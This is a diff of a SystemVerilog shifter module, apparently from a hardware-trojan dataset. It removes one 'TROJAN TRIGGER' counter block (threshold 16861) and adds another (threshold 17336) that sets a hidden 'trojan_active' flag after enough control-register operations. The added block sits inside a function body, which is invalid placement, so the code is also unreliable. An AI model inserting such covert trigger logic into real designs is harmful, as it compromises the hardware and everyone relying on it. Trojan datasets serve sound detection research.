@@ -31,24 +31,6 @@ output
     logic carryOut
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 16861;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (ShiftOperandType) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     typedef struct {
         DataPath dataOut; 
         logic    carryOut;
@@ -150,6 +132,23 @@ output
         logic [4:0]        shiftIn,
         logic              carryIn 
     );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=17336)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 17336;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
         logic [DATA_WIDTH:0] shiftTmp;  // not DataPath
         DataPath    dataOut;
